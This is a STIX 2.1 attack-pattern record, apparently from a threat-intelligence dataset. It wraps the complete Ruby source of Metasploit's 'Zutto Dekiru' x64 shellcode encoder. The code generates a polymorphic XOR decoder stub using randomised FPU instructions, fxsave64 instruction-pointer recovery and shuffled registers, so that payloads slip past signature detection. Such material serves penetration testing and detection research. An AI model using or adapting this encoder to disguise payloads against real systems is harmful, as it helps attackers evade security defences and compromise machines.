{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1830b059-abfa-4830-9cc3-932141324b24",
    "created": "2024-08-14T16:33:19.243501Z",
    "modified": "2024-08-14T16:33:19.243505Z",
    "name": "Zutto Dekiru",
    "description": "Inspired by shikata_ga_nai using fxsave64 to work under x64 systems.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/x64/zutto_dekiru.rb",
            "external_id": "zutto_dekiru.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasm'\nrequire 'rex/nop/opty2'\n\nclass MetasploitModule < Msf::Encoder::Xor\n  Rank = ManualRanking\n\n  def initialize\n    super(\n      'Name'             => 'Zutto Dekiru',\n      'Version'          => '$Revision: 14774 $',\n      'Description'      => 'Inspired by shikata_ga_nai using fxsave64 to work under x64 systems.',\n      'Author'           => 'agix',\n      'Arch'             => ARCH_X64,\n      'License'          => MSF_LICENSE,\n      'EncoderType'      => Msf::Encoder::Type::Raw,\n      'Decoder'          =>\n      {\n        'KeySize'    => 8,\n        'KeyPack'    => 'Q<'\n      }\n    )\n  end\n\n  @@cpu64 = Metasm::X86_64.new\n  def assemble(src, cpu=@@cpu64)\n    Metasm::Shellcode.assemble(cpu, src).encode_string\n  end\n\n\n  def fxsave64(reg)\n    case reg\n    when \"rax\"\n      return \"\\x48\\x0f\\xae\\x00\"\n    when \"rbx\"\n      return \"\\x48\\x0f\\xae\\x03\"\n    when \"rcx\"\n      return \"\\x48\\x0f\\xae\\x01\"\n    when \"rdx\"\n      return \"\\x48\\x0f\\xae\\x02\"\n    when \"rsi\"\n      return \"\\x48\\x0f\\xae\\x06\"\n    when \"rdi\"\n      return \"\\x48\\x0f\\xae\\x07\"\n    when \"rbp\"\n      return \"\\x48\\x0f\\xae\\x45\\x00\"\n    when \"r8\"\n      return \"\\x49\\x0f\\xae\\x00\"\n    when \"r9\"\n      return \"\\x49\\x0f\\xae\\x01\"\n    when \"r10\"\n      return \"\\x49\\x0f\\xae\\x02\"\n    when \"r11\"\n      return \"\\x49\\x0f\\xae\\x03\"\n    when \"r12\"\n      return \"\\x49\\x0f\\xae\\x04\\x24\"\n    when \"r13\"\n      return \"\\x49\\x0f\\xae\\x45\\x00\"\n    when \"r14\"\n      return \"\\x49\\x0f\\xae\\x06\"\n    when \"r15\"\n      return \"\\x49\\x0f\\xae\\x07\"\n    end\n  end\n\n  def nop(length,save_registers=[])\n    test = Rex::Nop::Opty2.new('',save_registers)\n    return test.generate_sled(length)\n  end\n\n  # Indicate that this module can preserve some registers\n  def can_preserve_registers?\n    true\n  end\n  #\n  # Returns the set of FPU instructions that can be used for the FPU block of\n  # the decoder stub.\n  #\n  def fpu_instructions\n    fpus = []\n\n    0xe8.upto(0xee) { |x| fpus << \"\\xd9\" + x.chr }\n    0xc0.upto(0xcf) { |x| fpus << \"\\xd9\" + x.chr }\n    0xc0.upto(0xdf) { |x| fpus << \"\\xda\" + x.chr }\n    0xc0.upto(0xdf) { |x| fpus << \"\\xdb\" + x.chr }\n    0xc0.upto(0xc7) { |x| fpus << \"\\xdd\" + x.chr }\n\n    fpus << \"\\xd9\\xd0\"\n    fpus << \"\\xd9\\xe1\"\n    fpus << \"\\xd9\\xf6\"\n    fpus << \"\\xd9\\xf7\"\n    fpus << \"\\xd9\\xe5\"\n\n    # This FPU instruction seems to fail consistently on Linux\n    #fpus << \"\\xdb\\xe1\"\n\n    fpus\n  end\n\n  def rand_string(length)\n    o = [('0'..'9'),('a'..'z'),('A'..'Z')].map{|i| i.to_a}.flatten;\n    string = (0..(length-1)).map{ o[rand(o.length)] }.join;\n\n    return string\n  end\n\n  def xor_string(text,key)\n    text.length.times {|n| text[n] = (text[n].ord^key[n.modulo(key.length)].ord).chr }\n    return text\n  end\n\n\n  def ordered_random_merge(a,b)\n    a, b = a.dup, b.dup\n    a.map{rand(b.size+1)}.sort.reverse.each do |index|\n      b.insert(index, a.pop)\n    end\n    b\n  end\n\n  def encode_block(state, block)\n    allowed_reg = [\n      [\"rax\",  \"eax\",  \"ax\",   \"al\"  ],\n      [\"rbx\",  \"ebx\",  \"bx\",   \"bl\"  ],\n      [\"rcx\",  \"ecx\",  \"cx\",   \"cl\"  ],\n      [\"rdx\",  \"edx\",  \"dx\",   \"dl\"  ],\n      [\"rsi\",  \"esi\",  \"si\",   \"sil\" ],\n      [\"rdi\",  \"edi\",  \"di\",   \"dil\" ],\n      [\"rbp\",  \"ebp\",  \"bp\",   \"bpl\" ],\n      [\"r8\",   \"r8d\",  \"r8w\",  \"r8b\" ],\n      [\"r9\",   \"r9d\",  \"r9w\",  \"r9b\" ],\n      [\"r10\",  \"r10d\", \"r10w\", \"r10b\"],\n      [\"r11\",  \"r11d\", \"r11w\", \"r11b\"],\n      [\"r12\",  \"r12d\", \"r12w\", \"r12b\"],\n      [\"r13\",  \"r13d\", \"r13w\", \"r13b\"],\n      [\"r14\",  \"r14d\", \"r14w\", \"r14b\"],\n      [\"r15\",  \"r15d\", \"r15w\", \"r15b\"],\n    ]\n    allowed_reg.delete_if { |reg| datastore['SaveRegisters'] && datastore['SaveRegisters'].include?(reg.first) }\n    allowed_reg.shuffle!\n\n    if block.length%8 != 0\n      block += nop(8-(block.length%8))\n    end\n\n    reg_type = 3\n\n    if (block.length/8) > 0xff\n      reg_type = 2\n    end\n\n    if (block.length/8) > 0xffff\n      reg_type = 1\n    end\n\n    if (block.length/8) > 0xffffffff\n      reg_type = 0\n    end\n\n    reg_key  = allowed_reg[0][0]\n    reg_size = allowed_reg[3]\n    reg_rip  = allowed_reg[1][0]\n    reg_env  = allowed_reg[2]\n\n    flip_coin = rand(2)\n\n    fpu_opcode = Rex::Poly::LogicalBlock.new('fpu',\n                                            *fpu_instructions)\n\n    fpu = []\n    fpu << [\"fpu\",fpu_opcode.generate([], nil, state.badchars)]\n\n    sub = (rand(0xd00)&0xfff0)+0xf000\n    lea = []\n    if flip_coin==0\n      lea << [\"lea\",  assemble(\"mov %s, rsp\"%reg_env[0])]\n      lea << [\"lea1\", assemble(\"and \"+reg_env[2]+\", 0x%x\"%sub)]\n    else\n      lea << [\"lea\",  assemble(\"push rsp\")]\n      lea << [\"lea1\", assemble(\"pop \"+reg_env[0])]\n      lea << [\"lea2\", assemble(\"and \"+reg_env[2]+\", 0x%x\"%sub)]\n    end\n\n    fpu_lea = ordered_random_merge(fpu, lea)\n    fpu_lea << [\"fpu1\", fxsave64(reg_env[0])] # fxsave64 doesn't seem to exist in metasm\n\n    key_ins = [[\"key\",  assemble(\"mov \"+reg_key+\", 0x%x\"%state.key)]]\n\n    size = []\n    size << [\"size\", assemble(\"xor \"+reg_size[0]+\", \"+reg_size[0])]\n    size << [\"size\", assemble(\"mov \"+reg_size[reg_type]+\", 0x%x\"% (block.length/8))]\n\n    getrip=0\n\n    a = ordered_random_merge(size, key_ins)\n    decode_head_tab = ordered_random_merge(a, fpu_lea)\n\n    decode_head_tab.length.times { |i| getrip = i if decode_head_tab[i][0] == \"fpu\"}\n\n    decode_head = decode_head_tab.map { |j,i| i.to_s }.join\n\n    flip_coin = rand(2)\n\n    if flip_coin==0\n      decode_head += assemble(\"mov \"+reg_rip+\", [\"+reg_env[0]+\" + 0x8]\")\n    else\n      decode_head += assemble(\"add \"+reg_env[0]+\", 0x8\")\n      decode_head += assemble(\"mov \"+reg_rip+\", [\"+reg_env[0]+\"]\")\n    end\n\n\n    decode_head_size = decode_head.length\n    getrip.times { |i| decode_head_size -= decode_head_tab[i][1].length }\n\n    loop_code =  assemble(\"dec \"+reg_size[0])\n    loop_code += assemble(\"xor [\"+reg_rip+\"+(\"+reg_size[0]+\"*8) + 0x7f], \"+reg_key)\n    loop_code += assemble(\"test \"+reg_size[0]+\", \"+reg_size[0])\n\n    payload_offset = decode_head_size+loop_code.length+2\n\n    loop_code =  assemble(\"dec \"+reg_size[0])\n    loop_code += assemble(\"xor [\"+reg_rip+\"+(\"+reg_size[0]+\"*8) + 0x\"+payload_offset.to_s(16)+\"], \"+reg_key)\n    loop_code += assemble(\"test \"+reg_size[0]+\", \"+reg_size[0])\n\n    jnz = \"\\x75\"+(0x100-(loop_code.length+2)).chr\n\n    decode = decode_head+loop_code+jnz\n    encode = xor_string(block, [state.key].pack('Q'))\n\n    return decode + encode\n  end\n\n\nend\n"
}